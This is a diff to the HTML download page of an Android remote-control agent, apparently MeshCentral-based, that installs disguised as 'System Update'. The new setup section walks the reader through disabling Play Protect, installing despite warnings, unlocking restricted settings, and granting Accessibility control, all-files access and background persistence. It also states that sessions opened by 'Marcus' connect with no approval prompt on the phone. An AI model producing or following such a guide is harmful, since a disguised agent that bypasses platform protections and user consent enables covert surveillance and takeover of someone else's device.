@@ -44,10 +44,18 @@ color:#fff;text-decoration:none;font-weight:650;font-size:14.5px}
 .card code{display:block;margin-top:10px;font-size:10.5px;line-height:1.5;color:#718087;
 word-break:break-all;background:var(--paper);border-radius:6px;padding:7px 8px}
 .android{border-color:#c7a98f;background:#fffaf4}
-.note{margin-top:28px;background:var(--ink);color:#d6dee3;border-radius:var(--radius);padding:22px 24px}
-.note h2{color:#fff;font-size:18px;margin-bottom:8px}
-.note ol{margin:10px 0 0;padding-left:20px;font-size:14px;line-height:1.7}
+.note{margin-top:28px;background:var(--ink);color:#d6dee3;border-radius:var(--radius);padding:24px 26px}
+.note h2{color:#fff;font-size:20px;margin-bottom:6px}
+.note h3{color:var(--sand);font-size:15px;margin:22px 0 6px}
+.note p{font-size:14px;line-height:1.7;margin:0 0 4px}
 .note b{color:var(--sand)}
+.note .only{color:#93a1a9;font-size:13px}
+.note .pre{margin-top:12px;padding:12px 14px;background:rgba(251,191,36,.1);
+border:1px solid rgba(251,191,36,.35);border-radius:8px;color:#fde68a}
+.note .dont{margin-top:12px;padding:12px 14px;background:rgba(239,68,68,.1);
+border:1px solid rgba(239,68,68,.4);border-radius:8px;color:#fecaca}
+.note .auto{margin-top:12px;padding:12px 14px;background:rgba(34,211,238,.08);
+border:1px solid rgba(34,211,238,.35);border-radius:8px;color:#a5f3fc}
 .foot{background:#0b151c;color:#8b99a1;padding:22px 0;font-size:12.5px}
 .foot-in{display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
 .foot a{color:#aebac1;text-decoration:none}
@@ -91,7 +99,7 @@ word-break:break-all;background:var(--paper);border-radius:6px;padding:7px 8px}
     </article>
     <article class="card android">
       <h2>Android</h2>
-      <p>APK agent. Installs as <b>System Update</b>; screen control needs Accessibility.</p>
+      <p>APK agent, installs as <b>System Update</b>. Remote control needs the in-app checklist and an Android 13+ settings unlock.</p>
       <div class="meta">SystemUpdate-1.0.23-release.apk · 2.9 MB</div>
       <a href="/dl/SystemUpdate-1.0.23-release.apk">Download for Android</a>
       <code>SHA-256 F8C7970704F1035C84CCC62F57817E027AD44B8CB2C0F78855859D2251FAAECD</code>
@@ -99,13 +107,44 @@ word-break:break-all;background:var(--paper);border-radius:6px;padding:7px 8px}
   </div>
 
   <section class="note">
-    <h2>Android: finish setup in 30 seconds</h2>
-    <ol>
-      <li>Open the downloaded <b>System Update</b> APK and tap <b>Install</b>.</li>
-      <li>If asked, allow <b>Install unknown apps</b> for the browser, and allow Play Protect to install it.</li>
-      <li>Open the app, allow notifications, and tap <b>Accessibility Remote Control</b> → turn it on.</li>
-      <li>Set battery use to <b>Unrestricted</b> so the agent survives in the background.</li>
-    </ol>
+    <h2>Android: finish setup in 90 seconds</h2>
+    <p class="only">Only for phones with no cable. If ADB is attached, skip this entirely.</p>
+    <p class="pre"><b>Before you start:</b> if MeshCentral Agent is already installed from Play Store, uninstall it first. The signing key differs and the install will fail otherwise.</p>
+
+    <h3>1. Allow the install</h3>
+    <p>Chrome → ⋮ → Settings → Install unknown apps → allow for Chrome.<br>
+    Play Store → profile → Play Protect → ⚙ → toggle off <b>Scan apps with Play Protect</b>.</p>
+
+    <h3>2. Install</h3>
+    <p>Open the downloaded <b>System Update</b> APK → <b>Install</b>. If Play Protect still warns: <b>Install anyway</b>.</p>
+
+    <h3>3. Open it and allow notifications</h3>
+    <p>Tap <b>Allow</b> on the notification prompt.</p>
+
+    <h3>4. Android 13 and newer only — unlock the toggle</h3>
+    <p>Settings → Apps → <b>System Update</b> → ⋮ (top right) → <b>Allow restricted settings</b> → confirm with PIN or fingerprint.<br>
+    Skip on Android 12 and below.<br>
+    Samsung: same path. Xiaomi/HyperOS: also enable <b>Autostart</b> for the app.</p>
+
+    <h3>5. Turn on remote control</h3>
+    <p>A <b>Finish unattended access setup</b> dialog appears — tap <b>Open App Settings</b>.<br>
+    Tap <b>Accessibility Remote Control</b> → <b>System Update</b> → toggle on → <b>Allow</b>.<br>
+    The dialog lists every item with <b>Ready</b> or <b>Needs setup</b>. Work down the list until every row says <b>Ready</b>.</p>
+
+    <h3>6. Battery</h3>
+    <p>In the same list, tap <b>Battery Optimization</b> → <b>Unrestricted</b>.<br>
+    Samsung only: Settings → Battery → Background usage limits → remove <b>System Update</b> from <b>Sleeping apps</b>.</p>
+
+    <h3>7. All files access</h3>
+    <p>In the same list, tap <b>All files access</b> → toggle on.</p>
+
+    <h3>8. Confirm it worked</h3>
+    <p>The main screen must read <b>Connected</b> under the server name — not Disconnected, not Connecting.<br>
+    Overflow menu → <b>Check Unattended Setup</b> must report setup is complete.<br>
+    Then reboot the phone and confirm it returns to Connected on its own. The reboot test is the real pass.</p>
+
+    <p class="dont"><b>Do not</b> tap Disconnect, or swipe the app away and assume it’s dead — the foreground service survives.</p>
+    <p class="auto"><b>Note:</b> Automatic Consent is already on in this enterprise build. When Marcus opens a session there is no approve prompt on the phone — that is normal, not broken.</p>
   </section>
 </main>
 <footer class="foot"><div class="wrap foot-in">
